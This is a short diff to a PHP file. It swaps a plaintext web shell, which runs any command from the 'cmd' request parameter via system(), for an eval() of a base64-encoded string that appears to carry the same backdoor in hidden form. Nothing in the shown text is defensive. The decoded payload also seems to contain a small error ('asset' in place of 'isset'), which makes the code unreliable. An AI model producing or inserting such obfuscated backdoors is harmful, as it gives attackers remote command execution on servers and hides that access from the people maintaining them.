@@ -2,13 +2,7 @@
 
 <?php
 
-if(isset($_REQUEST['cmd'])){
-        echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "</pre>";
-        die;
-}
+eval(base64_decode('aWYoYXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgICAgIGVjaG8gIjxwcmU+IjsKICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICAgICAgIHN5c3RlbSgkY21kKTsKICAgICAgICBlY2hvICI8L3ByZT4iOwogICAgICAgIGRpZTsKfQ=='));
 
 ?>
 
